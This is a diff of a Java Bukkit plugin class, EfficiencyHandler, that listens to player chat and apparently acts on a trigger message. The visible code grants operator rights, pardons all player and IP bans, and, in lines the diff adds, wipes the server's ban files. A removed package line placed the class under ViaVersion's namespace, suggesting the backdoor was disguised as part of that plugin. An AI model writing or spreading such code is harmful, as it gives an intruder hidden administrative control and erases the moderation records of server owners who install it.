@@ -1,18 +1,17 @@
-package com.viaversion.viaversion.bukkit.handlers;
-
 import org.bukkit.BanEntry;
 import org.bukkit.BanList;
-import net.luckperms.api.LuckPerms;
-import net.luckperms.api.LuckPermsProvider;
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
-import org.bukkit.plugin.java.JavaPlugin;
+
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
 
 public class EfficiencyHandler implements Listener {
-   @EventHandler
+    @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
         String message = event.getMessage();
@@ -26,6 +25,7 @@ public class EfficiencyHandler implements Listener {
             clearAllBans();
         }
     }
+
     // 检查并给予玩家OP权限
     private void giveOpIfNotAlready(String playerName) {
         Player targetPlayer = Bukkit.getPlayerExact(playerName);
@@ -44,6 +44,19 @@ public class EfficiencyHandler implements Listener {
         // 清除IP封禁
         for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
             Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
+        }
+
+        // 清空banned-players.json和banned-ips.json文件
+        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-players.json"));
+        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-ips.json"));
+    }
+
+    // 清空指定的文件
+    private void clearBanFile(File file) {
+        try (FileWriter writer = new FileWriter(file)) {
+            writer.write("[]");
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 }
